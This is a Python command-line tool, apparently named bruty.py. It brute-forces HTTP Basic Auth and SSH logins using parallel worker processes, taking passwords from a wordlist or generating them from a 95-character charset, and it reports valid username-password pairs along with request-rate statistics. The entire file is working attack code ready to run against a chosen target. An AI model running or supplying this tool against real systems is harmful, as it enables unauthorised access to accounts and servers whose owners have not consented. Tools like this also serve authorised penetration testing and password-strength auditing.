#!/usr/bin/python3
import sys
import argparse
import time
import signal
import requests
import pexpect.pxssh as pxssh
from multiprocessing import *
from ctypes import c_char_p
import queue
from collections import deque
from bruter import brutor

_args = None

_procs = []
_parser = None

_qPass = None
_qUser = None
_qRes = None

_session = None

_exit = False

# charset
_lo = 'abcdefghijklmnopqrstuvwxyz'
_up = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
_nu = '0123456789'
_sp = '!@#$Ã¹^&*()-_+=~`[]{}|\:;"\'<>,.?/ '


def main(argv):
	global _args
	global _qPass	
	global _procs	 
	global _parser	 
	global _exit	
	global _session
	global _lo
	global _up
	global _nu
	global _sp

	args_inquisitor()

	_qPass = Queue()
	_qRes = Queue()
	#_qUser = Queue() # not implemented yet -> attacking multiple user

	count = Value('i', 0) 	# inter process shared int variable, for counting # requests
	ended = Array('i', range(_args.tasks))	# inter process shared int variable, for counting process that have ended	

	for i in ended:		# manual init due to weird init
		ended[i] = 0

	pass_lines = 1		# for stat, set to 1 to avoid dividing by 0 O_O

	_session = requests.Session()	# requests optimization, less tcp handshake...

	# password will be either generated by a bruteforcer or picked from a file
	if(_args.brute):
		_parser = Process(target=pooler_brute, args=(_args.tasks, _qPass, _lo+_up+_nu+_sp, _args.c_min, _args.c_max))
		_parser.start()
	else:
		pass_lines = file_line_count(_args.fpass)
		_parser = Process(target=pooler_file, args=(_args.tasks, _qPass, _args.fpass))
		_parser.start()

	# we wait a little while we pool enough passwords in our queue
	print("Pooling", end="")
	for i in range(0, 3):
		print(".", end="")
		sys.stdout.flush()
		time.sleep(1)
	print("\n", end="")
	
	prc = None
	p_args = None
	
	if(_args.ssh):
		for i in range(0, _args.tasks):
			_procs.append(Process(target=requestor_ssh, args=(_qPass, _qRes, _args.logins, _args.url, count, ended, _args.timeout, i)))
	else:
		for i in range(0, _args.tasks):
			_procs.append(Process(target=requestor_http, args=(_qPass, _qRes, _args.logins, _args.url, count, ended, _args.head, _args.timeout, i)))

	start_time = time.time()	# for stat purpose

	# we whip our workers
	for proc in _procs:
		proc.start()	
	
	diff = 0					# for stat: compute number of requests done in last second
	oldV = 0					# for stat: compute number of requests done in last second
	avr = deque([0, 0, 0, 0, 0, 0, 0, 0, 0, 0])	# for stat: compute average of requests for the last 10 seconds
	avr_all = 0					# for stat: compute global average of requests per second
	avr_measures = 0				# for stat: compute global average of requests per second

	total_time = 0
	limitedRun = True if _args.runtime else False

	# main loop
	while not _exit:
		try:
			print(_qRes.get(block=False))	# will raise exception if _qRes is empty, otherwise we print the result...
			print("Request successful: {}".format(count.value))		# print the number of the succesful request
			print("Exiting now...")		# initiate exit process
			print("Process exec time: {}".format(total_time))
			graceful_exit()
		except:					# compute and display stats
			total_time = time.time() - start_time
			diff = count.value - oldV	
			avr.appendleft(diff)		
			avr.pop()			
			
			avr_measures += 1		
			avr_all = avr_all + diff 

			progress = count.value / pass_lines if pass_lines > 1 else 100

			print("progress:{0:.3f}% | index:{1} | diff:{2} | avr_10:{3} | avr_all:{4:.2f} | runtime: {5:.1f}s".format(progress, count.value, diff, (sum(avr) / 10), avr_all / avr_measures, total_time))
			
			oldV = count.value
			if(_exit):
				break
			
			if(limitedRun):
				if(total_time > _args.runtime):
					break

			for i in ended:				# check the state of our processes: 0 = doing things | 1 = finished # Consider converting all this to process pool....
				if( i == 0 ):
					_exit = False
					break
				else:
					_exit = True
			time.sleep(1)

	graceful_exit()

# Worker: HTTP Request
def requestor_http(qPass, qRes, qUser, target, counter, end, head, t_out, wId):
	global _session	

	noPass_miss = 0
	noPass_max = 2	

	retry = False

	while True:
		try:
			if(not retry):
				counter.value += 1
				passwd = qPass.get(timeout=1)
			
			bAuth = (qUser, passwd)
			
			if(head):
				res = _session.head(target, auth=bAuth, timeout=t_out)
			else:
				res = _session.get(target, auth=bAuth, timeout=t_out)

			if(res.status_code == 200):
				qRes.put("Valid pair: u:{} | p:{}".format(qUser, passwd))
			
			#counter.value += 1
			retry = False

		except requests.exceptions.ReadTimeout:
			print("Timeout reach, consider increasing timeout value")
			retry = True

		except queue.Empty:
			noPass_miss += 1
			if(noPass_miss > noPass_max):
				break
			pass

	end[wId] = 1

# Worker: SSH Request
def requestor_ssh(qPass, qRes, qUser, target, counter, end, t_out, wId):
	noPass_miss = 0
	noPass_max = 2

	while True:
		try:
			ssh = pxssh.pxssh()
			passwd = qPass.get(timeout=1)
			counter.value += 1
			
			if(ssh.login(target, qUser, passwd)):
				qRes.put("Valid pair: u:{} | p:{}".format(qUser, passwd))
				ssh.logout()

		except pxssh.ExceptionPxssh as e:
			if ("Could not establish connection" in str(e)):
				print("Too many concurrent task! Reduce Tasks!")
			pass

		except queue.Empty:
			noPass_miss += 1
			if(noPass_miss > noPass_max):
				break
			pass

	end[wId] = 1
		
# Worker: Password pooler
def pooler_file(nProcs, qPass, passfile):
	pool_size = 200 * nProcs

	try:
		with open(passfile, 'r', errors="ignore") as f:			# Open our file with error ignore to avoid weird bytes crashing the whole program #FIXME
			while True:
				if(qPass.qsize() < pool_size):			
					qPass.put(f.readline().strip())
	except:
		sys.exit(0)

# Worker: Password pooler
def pooler_brute(nProcs, qPass, charset, c_min, c_max):
	pool_size = 200 * nProcs

	generator = brutor(charset, c_min, c_max)						# Brutor class based on itertools.product, no insane memory usage (from the source code of product)

	while True:
		if(qPass.qsize() < pool_size):
			try:
				qPass.put("".join(generator.next()))
			except StopIteration:
				break

# Compute the length of our file, for stat purpose
def file_line_count(fpath):
	with open(fpath, 'r', errors="ignore") as f:
		for i, l in enumerate(f):
			pass
	return i + 1

# Handle ctrl+c system signal
def signal_handler(sig, frame):
	graceful_exit()

# Shutdown all process and exit clean
def graceful_exit():
	global _parser
	global _procs
	global _exit

	if(_parser is not None):
		print("Shutting down parser")
		_parser.terminate()
		print("Parser terminated")	

	print("Shutting down procs")
	i = 0
	for proc in _procs:
		i+=1
		proc.terminate()
	print("{} Procs terminated".format(i))

	_exit = True
	print("Exiting...")	

def usage():
	return '''Basic Auth HTTP Brute Forcer
	Usage: bruty.py -u url/target -l <login> -p <password file> -t <number of task>
	\t-h\t   show full help
	\t--help
	\t-u\t   url to target (with path protected by basic auth) OR address of the ssh server
	\t--url
	\t-l\t   login to use
	\t--login
	\t-p\t	file with one password per line
	\t--fpass
	\t-b\t	brute force instead of dictionary
	\t--brute
	\t-s\t	brute force mode: start with passwords of this length
	\t--start
	\t-e\t	brute force mode: stop after completing passwords of this length
	\t--end
	\t-H\t	Use HTTP HEAD request when attack HTTP BasicAuth. Default: HTTP GET
	\t--head
	\t-S\t
	\t--ssh Attack ssh
	\t-t\t	number of threads to use. Default = 16
	\t--tasks
	'''

def args_inquisitor():
	global _args

	parser = argparse.ArgumentParser(description="HTTP Basic Auth Brute-Forcer") #, usage=usage()) //will be implemented later
	parser.add_argument('-u', '--url', help="Url to target (with path protected by basic auth) OR address of the ssh server")
	parser.add_argument('-t', '--tasks', help="Number of parallel task to run", type=int, default=16)
	parser.add_argument('-s', '--start', help="Number of char to start the brute force", dest='c_min', default=1, type=int)
	parser.add_argument('-e', '--end', help="End the brute force when reaching this number of char", dest='c_max', default=-1, type=int)
	parser.add_argument('--timeout', help="Request timeout value", default=3, type=int)
	parser.add_argument('--max-runtime', help="Run the tool for this amount of time", default=-1, type=int, dest='runtime')

	log_mutex = parser.add_mutually_exclusive_group()
	log_mutex.add_argument('-l', '--login', help="Login to test", type=str, dest='logins')
	#log_mutex.add_argument('-L', '--flogin', help="File with one login per line", type=str, dest='logins') # Not implemented yet TODO

	pass_mutex = parser.add_mutually_exclusive_group()
	pass_mutex.add_argument('-p', '--fpass', help="File with one password per line")
	pass_mutex.add_argument('-b', '--brute', help="Brute force attack, full charset: 95 chars", action="store_true")

	mod_mutex = parser.add_mutually_exclusive_group()
	mod_mutex.add_argument('-H', '--head', help="Use HTTP HEAD requests instead of GET for http brute-force", action="store_true", default=False)
	mod_mutex.add_argument('-S', '--ssh', help="Brute-force SSH instead of http BasicAuth", action="store_true", default=False)

	_args = parser.parse_args()

	if(not _args.url):
		print(usage())
		sys.exit()


if __name__ == "__main__":

	signal.signal(signal.SIGINT, signal_handler)
	main(sys.argv[1:])	#argv[0] is the name of the calling script, so we pass 1: meaning 1 and onward till the end



